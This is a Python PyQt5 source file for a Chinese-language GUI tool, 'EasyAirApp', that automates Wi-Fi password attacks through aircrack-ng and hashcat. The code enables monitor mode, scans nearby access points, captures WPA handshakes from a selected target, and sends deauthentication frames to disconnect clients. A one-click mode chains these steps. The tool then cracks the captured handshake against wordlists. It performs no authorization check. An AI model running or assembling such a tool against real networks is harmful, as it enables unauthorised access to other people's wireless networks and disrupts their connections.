#!/usr/bin/env python3
import sys
import re
import signal
from pathlib import Path
from PyQt5.QtWidgets import QApplication, QMessageBox, QTableWidgetItem, QFileDialog
from PyQt5.QtCore import QThread, pyqtSignal, QTimer

from ui.main_ui import MainUI
from core.aircore import AirCore

class CmdThread(QThread):
    line_out = pyqtSignal(str)
    finished = pyqtSignal()

    def __init__(self, proc):
        super().__init__()
        self.proc = proc
        self._stop = False

    def run(self):
        try:
            if not self.proc:
                return
            for line in self.proc.stdout:
                if self._stop:
                    break
                self.line_out.emit(line.rstrip())
            self.proc.wait()
        finally:
            self.finished.emit()

    def stop(self):
        self._stop = True
        if self.proc:
            try:
                self.proc.terminate()
            except Exception:
                pass


class EasyAirApp(MainUI):
    def __init__(self):
        super().__init__()
        self.core = AirCore(Path(__file__).parent)
        self.scan_thread = None
        self.cap_thread = None
        self.crack_thread = None
        self.conv_thread = None
        self.mon_thread = None
        self.mon_iface = None
        self.physical_iface = None
        self._last_csv = None
        self.auto_monitor_enabled = True

        self.scan_timer = QTimer(self)
        self.scan_timer.timeout.connect(self._parse_scan_csv)
        self.scan_timer.setInterval(1500)

        self._bind()
        self._load_wordlists()
        self._refresh_ifaces()
        self._refresh_cap()

    def _bind(self):
        # 网卡
        self.btn_refresh.clicked.connect(self._refresh_ifaces)
        self.btn_mon_toggle.toggled.connect(self._on_mon_toggle)

        # 扫描
        self.btn_scan.clicked.connect(self._start_scan)
        self.btn_stop_scan.clicked.connect(self._stop_scan)
        self.btn_capture.clicked.connect(self._start_capture)
        self.btn_deauth.clicked.connect(self._do_deauth)
        self.btn_auto.clicked.connect(self._auto_full)

        # 字典
        self.btn_add_wl.clicked.connect(self._add_wordlist_files)
        self.btn_add_wl_dir.clicked.connect(self._add_wordlist_dir)
        self.btn_clear_wl.clicked.connect(self._clear_wordlists)
        self.wordlist_widget.order_changed.connect(self._on_wordlist_order_changed)

        # 破解
        self.btn_choose_cap.clicked.connect(self._choose_cap)
        self.btn_refresh_cap.clicked.connect(self._refresh_cap)
        self.btn_crack.clicked.connect(self._start_crack)
        self.btn_stop_crack.clicked.connect(self._stop_crack)

        # 配置变更
        self.chk_auto_mon.toggled.connect(self._on_auto_mon_changed)
        self.crack_engine.currentIndexChanged.connect(self._on_engine_changed)
        self.device_combo.currentIndexChanged.connect(self._on_device_changed)
        self.hashcat_extra.textChanged.connect(self._on_extra_args_changed)

    def log(self, txt: str):
        self.log_box.append(txt)
        self.log_box.ensureCursorVisible()

    # ===== 网卡与监听模式 =====
    def _refresh_ifaces(self):
        self.iface_combo.clear()
        for i in self.core.list_interfaces():
            self.iface_combo.addItem(i)
        if self.iface_combo.count() == 0:
            self.log("[提示] 未检测到无线网卡 (iw dev 无输出)")
            self.log("  - 真机: 确认网卡驱动正常")
            self.log("  - 虚拟机: 需将支持监听的 USB 无线网卡直通")

    def _on_mon_toggle(self, checked: bool):
        iface = self.iface_combo.currentText()
        if not iface:
            self.btn_mon_toggle.setChecked(False)
            return

        if checked:
            self.log(f"> 开启监听模式: {iface}")
            p = self.core.start_monitor(iface)
            self.mon_thread = CmdThread(p)
            self.mon_thread.line_out.connect(self.log)
            self.mon_thread.finished.connect(self._on_mon_started)
            self.mon_thread.start()
            self.physical_iface = iface
        else:
            mon = self.mon_iface or iface
            self.log(f"> 关闭监听模式: {mon}")
            p = self.core.stop_monitor(mon)
            t = CmdThread(p)
            t.line_out.connect(self.log)
            t.finished.connect(self._on_mon_stopped)
            t.start()

    def _on_mon_started(self):
        self._refresh_ifaces()
        # 查找新的 mon 接口
        for i in range(self.iface_combo.count()):
            txt = self.iface_combo.itemText(i)
            if "mon" in txt and self.physical_iface in txt:
                self.iface_combo.setCurrentIndex(i)
                self.mon_iface = txt
                self.log(f"[就绪] 监听接口: {txt}")
                break

    def _on_mon_stopped(self):
        self.mon_iface = None
        self.physical_iface = None
        self._refresh_ifaces()

    def _on_auto_mon_changed(self, checked: bool):
        self.auto_monitor_enabled = checked
        self.core.config["auto_monitor"] = checked
        self.core.save_config()
        self.log(f"[配置] 自动监听模式: {'开启' if checked else '关闭'}")

    def _ensure_monitor(self) -> bool:
        """自动确保监听模式开启，返回是否成功"""
        if not self.auto_monitor_enabled:
            return True
        if self.mon_iface and self.core.check_monitor_mode(self.mon_iface):
            return True
        physical = self.physical_iface or self.iface_combo.currentText()
        if not physical:
            return False
        self.log("[自动] 正在开启监听模式...")
        ok, mon = self.core.ensure_monitor(physical)
        if ok:
            self.mon_iface = mon
            self.btn_mon_toggle.setChecked(True)
            self.log(f"[自动] 监听模式已就绪: {mon}")
            return True
        self.log("[自动] 监听模式开启失败")
        return False

    def _auto_stop_monitor(self):
        """自动关闭监听模式（不抓包时）"""
        if self.auto_monitor_enabled and self.mon_iface:
            self.log("[自动] 关闭监听模式...")
            p = self.core.stop_monitor(self.mon_iface)
            t = CmdThread(p)
            t.line_out.connect(self.log)
            t.finished.connect(lambda: setattr(self, 'mon_iface', None))
            t.start()
            self.btn_mon_toggle.setChecked(False)

    # ===== 扫描 AP =====
    def _start_scan(self):
        if not self._ensure_monitor():
            QMessageBox.warning(self, "提示", "请先开启监听模式")
            return
        mon = self.mon_iface or self.iface_combo.currentText()
        self.log(f"> 扫描 AP: {mon}")
        p = self.core.airodump_scan(mon, "scan")
        self.scan_thread = CmdThread(p)
        self.scan_thread.line_out.connect(self.log)
        self.scan_thread.start()
        self.scan_timer.start()
        self.log("[扫描中] 正在列出附近 AP... 点击'停止扫描'查看列表")

    def _stop_scan(self):
        if self.scan_thread:
            self.scan_thread.stop()
            self.scan_thread = None
        self.scan_timer.stop()
        self._parse_scan_csv(force=True)
        self._auto_stop_monitor()
        self.log("[已停止] 扫描结束")

    def _find_latest_csv(self):
        csvs = list(self.core.caps_dir.glob("scan*.csv"))
        return max(csvs, key=lambda x: x.stat().st_mtime) if csvs else None

    def _parse_scan_csv(self, force=False):
        csv = self._find_latest_csv()
        if not csv or (csv == self._last_csv and not force):
            return
        self._last_csv = csv
        try:
            txt = csv.read_text(errors="ignore")
            ap_sec = txt.split("Station MAC")[0] if "Station MAC" in txt else txt
            rows = []
            for line in ap_sec.splitlines():
                line = line.strip()
                if not line or line.startswith(("BSSID", "Interface")):
                    continue
                parts = re.split(r',\s*', line)
                if len(parts) < 14:
                    continue
                bssid, ch, priv, cipher, auth, pwr, beac = parts[0], parts[3], parts[5], parts[6], parts[7], parts[8], parts[9]
                essid = ','.join(parts[13:]).strip().strip('"')
                if not bssid:
                    continue
                rows.append((essid or "(隐藏)", bssid, ch.strip(), priv.strip(), cipher.strip(), auth.strip(), pwr.strip()))
            if rows:
                self.ap_table.setRowCount(0)
                for r in rows:
                    i = self.ap_table.rowCount()
                    self.ap_table.insertRow(i)
                    for c, v in enumerate(r):
                        self.ap_table.setItem(i, c, QTableWidgetItem(v))
                self.log(f"[解析] 更新 AP 列表: {len(rows)} 个")
        except Exception as e:
            self.log(f"[解析失败] {e}")

    # ===== 抓包 =====
    def _start_capture(self):
        row = self.ap_table.currentRow()
        if row < 0:
            QMessageBox.warning(self, "提示", "请先从 AP 列表中选择一个目标")
            return
        if not self._ensure_monitor():
            QMessageBox.warning(self, "提示", "监听模式未就绪")
            return

        essid = self.ap_table.item(row, 0).text()
        bssid = self.ap_table.item(row, 1).text()
        ch = self.ap_table.item(row, 2).text()
        mon = self.mon_iface

        self.log(f"[抓包] 目标: {essid} | {bssid} | CH:{ch}")
        self.log(f"> airodump-ng --bssid {bssid} --channel {ch} -w captures/handshake {mon}")
        p = self.core.airodump_capture(mon, bssid, ch, "handshake")
        self.cap_thread = CmdThread(p)
        self.cap_thread.line_out.connect(self.log)
        self.cap_thread.start()
        self.log("[提示] 正在抓取握手包... 可点击'一键 Deauth'加速")
        self._refresh_cap()

    def _do_deauth(self):
        row = self.ap_table.currentRow()
        if row < 0:
            return
        if not self.mon_iface:
            return
        bssid = self.ap_table.item(row, 1).text()
        self.log(f"> aireplay-ng --deauth 10 -a {bssid} {self.mon_iface}")
        p = self.core.deauth(self.mon_iface, bssid, 10)
        t = CmdThread(p)
        t.line_out.connect(self.log)
        t.start()

    def _auto_full(self):
        """一键全自动：扫描 -> 用户选中 -> 抓包 -> Deauth"""
        if not self._ensure_monitor():
            QMessageBox.warning(self, "提示", "监听模式未就绪")
            return
        if self.scan_thread is None:
            self._start_scan()
            self.log("[自动] 请等待扫描完成，然后在列表选中目标，再次点击'一键全自动'开始抓包")
        else:
            self._stop_scan()
            self._start_capture()
            # 自动发送一次 deauth
            QTimer.singleShot(3000, self._do_deauth)

    # ===== 字典管理 =====
    def _load_wordlists(self):
        for wl in self.core.get_wordlists():
            self.wordlist_widget.add_wordlist(wl)

    def _add_wordlist_files(self):
        files, _ = QFileDialog.getOpenFileNames(self, "选择字典文件", str(self.core.wordlists_dir), "文本文件 (*.txt *.lst *.dic);;所有文件 (*.*)")
        for f in files:
            self.wordlist_widget.add_wordlist(f)
            self.core.add_wordlist(f)

    def _add_wordlist_dir(self):
        dir_path = QFileDialog.getExistingDirectory(self, "选择字典目录", str(self.core.wordlists_dir))
        if dir_path:
            for ext in ("*.txt", "*.lst", "*.dic", "*.dict"):
                for f in Path(dir_path).rglob(ext):
                    self.wordlist_widget.add_wordlist(str(f))
                    self.core.add_wordlist(str(f))

    def _clear_wordlists(self):
        self.wordlist_widget.clear()
        self.core.clear_wordlists()

    def _on_wordlist_order_changed(self, paths):
        self.core.reorder_wordlists(paths)

    # ===== 破解设置 =====
    def _on_engine_changed(self, idx):
        pass

    def _on_device_changed(self, idx):
        self.core.set_use_gpu(idx != 2)  # 2 = 仅 CPU

    def _on_extra_args_changed(self, txt):
        self.core.set_hashcat_extra_args(txt)

    # ===== 握手包选择 =====
    def _refresh_cap(self):
        cap = self.core.get_latest_handshake()
        if cap:
            self.cap_path.setText(str(cap))
            self.cap_path.setStyleSheet("color: #2e7d32; font-weight: bold;")
        else:
            self.cap_path.setText("未检测到握手包 (captures/handshake-*.cap)")
            self.cap_path.setStyleSheet("color: #c62828;")

    def _choose_cap(self):
        fn, _ = QFileDialog.getOpenFileName(self, "选择握手包", str(self.core.caps_dir), "CAP Files (*.cap);;All (*.*)")
        if fn:
            self.cap_path.setText(fn)
            self.cap_path.setStyleSheet("color: #2e7d32; font-weight: bold;")
            self.log(f"[已选择] 握手包: {fn}")

    # ===== 破解执行 =====
    def _start_crack(self):
        cap = self.cap_path.text()
        if not cap or cap.startswith("未检测") or cap.startswith("自动检测"):
            QMessageBox.warning(self, "提示", "请选择有效的握手包 .cap 文件")
            return
        wordlists = self.wordlist_widget.get_all()
        if not wordlists:
            QMessageBox.warning(self, "提示", "请至少添加一个字典文件")
            return

        self._auto_stop_monitor()

        engine = self.crack_engine.currentText()
        if engine == "Aircrack-ng":
            # 仅使用第一个字典
            self.log(f"> aircrack-ng '{cap}' -w '{wordlists[0]}'")
            p = self.core.crack_aircrack(cap, wordlists[0])
            self.crack_thread = CmdThread(p)
            self.crack_thread.line_out.connect(self.log)
            self.crack_thread.start()
            self.log("[破解中] Aircrack-ng 正在跑字典...")
        else:
            self._run_hashcat(cap, wordlists)

    def _run_hashcat(self, cap: str, wordlists: list):
        self.log("[Hashcat] 正在转换 .cap -> .hc22000...")
        pconv = self.core.cap_to_hc22000(cap)
        self.conv_thread = CmdThread(pconv)
        self.conv_thread.line_out.connect(self.log)

        def on_conv_done():
            hc = Path(cap).with_suffix(".hc22000")
            if hc.exists():
                self.log(f"[转换完成] {hc}")
                device_idx = self.device_combo.currentIndex()
                use_gpu = device_idx != 2
                extra = self.hashcat_extra.text().strip()
                self.log(f"> hashcat -m 22000 {'-D 1,2' if use_gpu else '-D 1'} {extra} '{hc}' {' '.join(wordlists)}")
                p2 = self.core.crack_hashcat(str(hc), wordlists, use_gpu, extra)
                self.crack_thread = CmdThread(p2)
                self.crack_thread.line_out.connect(self.log)
                self.crack_thread.start()
                self.log("[破解中] Hashcat 正在跑字典 (实时进度见日志)")
            else:
                self.log("[错误] hcxpcapngtool 转换失败，请检查 .cap 是否包含有效握手")

        self.conv_thread.finished.connect(on_conv_done)
        self.conv_thread.start()

    def _stop_crack(self):
        if self.crack_thread:
            self.crack_thread.stop()
            self.crack_thread = None
            self.log("[已停止] 破解已终止")
        if self.conv_thread:
            self.conv_thread.stop()
            self.conv_thread = None
            self.log("[已停止] 转换已终止")


if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    win = EasyAirApp()
    win.show()
    sys.exit(app.exec())
